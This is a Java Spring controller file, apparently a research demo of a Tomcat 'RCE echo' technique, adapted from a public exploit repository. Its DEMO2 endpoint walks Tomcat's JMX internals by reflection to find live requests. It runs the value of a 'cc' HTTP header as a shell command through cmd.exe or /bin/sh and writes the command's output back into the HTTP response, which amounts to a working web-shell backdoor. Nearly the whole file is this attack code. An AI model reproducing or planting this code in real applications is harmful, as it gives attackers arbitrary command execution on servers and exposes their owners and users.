package summersec.echo.Controller;

import com.sun.jmx.mbeanserver.NamedObject;
import org.apache.tomcat.util.modeler.Registry;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;

import com.sun.jmx.mbeanserver.NamedObject;
import com.sun.jmx.mbeanserver.Repository;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.coyote.Request;
import org.apache.tomcat.util.modeler.Registry;

import javax.management.DynamicMBean;
import javax.management.MBeanServer;
import javax.management.ObjectName;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.nio.ByteBuffer;
import java.util.*;

/**
 * @ClassName: TomcatEcho2
 * @Description: TODO
 * @Author: Summer
 * @Date: 2021/6/17 17:13
 * @Version: v1.0.0
 * @Description: https://github.com/feihong-cs/Java-Rce-Echo/blob/master/Tomcat/code/TomcatEchoTypeB-%E5%85%A8%E7%89%88%E6%9C%AC.jsp
 * httpheader cc: "cmd"
 **/
@Controller
public class TomcatEcho2 {

    @RequestMapping(value = "TomcatEcho2")
    public String TomcatEcho2(){
        return "TomcatEcho2";

    }
    @RequestMapping(value = "DEMO2")
    public void DEMO2()throws Exception{
        boolean flag = false;
        javax.management.MBeanServer mbeanServer = org.apache.tomcat.util.modeler.Registry.getRegistry((Object)null, (Object)null).getMBeanServer();
        Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
        field.setAccessible(true);
        Object obj = field.get(mbeanServer);

        field = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
        field.setAccessible(true);
        Repository repository  = (Repository) field.get(obj);
        Set<NamedObject> objectSet =  repository.query(new ObjectName("Catalina:type=GlobalRequestProcessor,*"), null);
        for(NamedObject namedObject : objectSet){
            DynamicMBean dynamicMBean = namedObject.getObject();
            field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
            field.setAccessible(true);
            obj = field.get(dynamicMBean);
            field = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
            field.setAccessible(true);
            ArrayList procssors = (ArrayList) field.get(obj);
            field = Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req");
            field.setAccessible(true);
            for(int i = 0; i < procssors.size(); i++){
                Request req = (Request) field.get(procssors.get(i));
                String cmd = req.getHeader("cc");
                if(cmd != null && !cmd.isEmpty()){
                    String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
                    String charsetName = System.getProperty("os.name").toLowerCase().contains("window") ? "GBK":"UTF-8";
                    byte[] result = (new Scanner((new ProcessBuilder(cmds)).start().getInputStream(),charsetName)).useDelimiter("\\A").next().getBytes(charsetName);
                    Object resp = req.getClass().getMethod("getResponse", new Class[0]).invoke(req, new Object[0]);
                    try {
                        Class cls = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
                        obj = cls.newInstance();
                        cls.getDeclaredMethod("setBytes", new Class[]{byte[].class, int.class, int.class}).invoke(obj, new Object[]{result, new Integer(0), new Integer(result.length)});
                        resp.getClass().getMethod("doWrite", new Class[]{cls}).invoke(resp, new Object[]{obj});
                    } catch (NoSuchMethodException var5) {
                        Class cls = Class.forName("java.nio.ByteBuffer");
                        obj = cls.getDeclaredMethod("wrap", new Class[]{byte[].class}).invoke(cls, new Object[]{result});
                        resp.getClass().getMethod("doWrite", new Class[]{cls}).invoke(resp, new Object[]{obj});
                    }
                    flag = true;
                }
                if(flag) {
                    break;
                }
            }
        }
    }



}
